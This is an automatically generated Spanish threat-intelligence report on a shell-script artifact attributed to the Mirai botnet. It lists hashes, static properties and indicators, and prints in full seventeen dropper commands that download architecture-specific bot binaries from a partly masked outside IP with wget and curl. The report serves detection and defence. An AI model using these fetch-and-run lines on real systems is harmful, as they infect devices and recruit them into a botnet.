# 🧬 Payload Analysis

`bb71242dca49d22b76648b365dac5796346ada57c387f349641f606d9633ae5c`

## 📌 Resumen

Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota. Se asociaron 17 comandos observados o extraídos.

## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:38:58+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `bb71242dca49d22b76648b365dac5796346ada57c387f349641f606d9633ae5c`
- **MD5:** `952375f10445811d0cec1bf4cef59c66`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF, LF line terminators |
| Tamaño | 4.0 KiB |
| Entropía | 4.99 |
| Strings | 42 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF, LF line terminators; iocs=10

## 🖥️ Comandos observados / extraídos

```text
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.arc; curl -O hxxp://41.216.189.XXX
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.arm; curl -O hxxp://41.216.189.XXX
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.arm5; curl -O hxxp://41[.]216[.]189[.]
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.arm6; curl -O hxxp://41[.]216[.]189[.]
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.arm7; curl -O hxxp://41[.]216[.]189[.]
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.i468; curl -O hxxp://41[.]216[.]189[.]
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.i686; curl -O hxxp://
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.i686; curl -O hxxp://41[.]216[.]189[.]
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.m68k; curl -O hxxp://41[.]216[.]189[.]
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.mips; curl -O hxxp://41[.]216[.]189[.]
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.mpsl; curl -O hxxp://41[.]216[.]189[.]
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.ppc; curl -O hxxp://41.216.189.XXX
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.sh4; curl -O hxxp://41.216.189.XXX
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.spc; curl -O hxxp://41.216.189.XXX
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.x86_64; curl -O hxxp://41[.]216[.]18
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.x86; curl -O hxxp://41.216.189.XXX
cp /bin/busybox /tmp/
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 41.216.189.XXX | static_analysis |
| url | hxxp://41.216.189.XXX/nz/nz.arc; | strings |
| url | hxxp://41.216.189.XXX/nz/nz.arm; | strings |
| url | hxxp://41.216.189.XXX/nz/nz.arm5; | strings |
| url | hxxp://41.216.189.XXX/nz/nz.arm6; | strings |
| url | hxxp://41.216.189.XXX/nz/nz.arm7; | strings |
| url | hxxp://41.216.189.XXX/nz/nz.i468; | strings |
| url | hxxp://41.216.189.XXX/nz/nz.i686; | strings |
| url | hxxp://41.216.189.XXX/nz/nz.m68k; | strings |
| url | hxxp://41.216.189.XXX/nz/nz.mips; | strings |
| url | hxxp://41.216.189.XXX/nz/nz.mpsl; | strings |
| url | hxxp://41.216.189.XXX/nz/nz.ppc; | strings |
| url | hxxp://41.216.189.XXX/nz/nz.sh4; | strings |
| url | hxxp://41.216.189.XXX/nz/nz.spc; | strings |
| url | hxxp://41.216.189.XXX/nz/nz.x86_64; | strings |
| url | hxxp://41.216.189.XXX/nz/nz.x86; | strings |
| hash | bb71242dca49d22b76648b365dac5796346ada57c387f349641f606d9633ae5c | static_analysis |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://41.216.189.XXX/nz/nz.arc; curl -O hxxp://41.216.189.XXX | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://41.216.189.XXX/nz/nz.arm; curl -O hxxp://41.216.189.XXX | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://41.216.189.XXX/nz/nz.arm5; curl -O hxxp://41[.]216[.]189[.] | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://41.216.189.XXX/nz/nz.arm6; curl -O hxxp://41[.]216[.]189[.] | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://41.216.189.XXX/nz/nz.arm7; curl -O hxxp://41[.]216[.]189[.] | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://41.216.189.XXX/nz/nz.i468; curl -O hxxp://41[.]216[.]189[.] | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://41.216.189.XXX/nz/nz.i686; curl -O hxxp:// | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://41.216.189.XXX/nz/nz.i686; curl -O hxxp://41[.]216[.]189[.] | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://41.216.189.XXX/nz/nz.m68k; curl -O hxxp://41[.]216[.]189[.] | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://41.216.189.XXX/nz/nz.mips; curl -O hxxp://41[.]216[.]189[.] | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://41.216.189.XXX/nz/nz.mpsl; curl -O hxxp://41[.]216[.]189[.] | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://41.216.189.XXX/nz/nz.ppc; curl -O hxxp://41.216.189.XXX | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://41.216.189.XXX/nz/nz.sh4; curl -O hxxp://41.216.189.XXX | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://41.216.189.XXX/nz/nz.spc; curl -O hxxp://41.216.189.XXX | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://41.216.189.XXX/nz/nz.x86_64; curl -O hxxp://41[.]216[.]18 | strings |
| command | cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget hxxp://41.216.189.XXX/nz/nz.x86; curl -O hxxp://41.216.189.XXX | strings |
| command | cp /bin/busybox /tmp/ | strings |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
